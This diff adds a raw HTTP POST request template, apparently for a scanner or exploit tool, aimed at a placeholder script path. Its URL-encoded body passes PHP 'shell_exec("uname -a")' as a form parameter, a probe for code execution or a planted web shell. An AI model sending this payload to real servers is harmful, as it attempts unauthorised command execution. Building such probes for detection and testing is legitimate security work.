@@ -1,0 +1,6 @@
+POST {script_path} HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 41
+Connection: close
+
+a=shell%5Fexec%28%22uname%20%2Da%22%29%3B
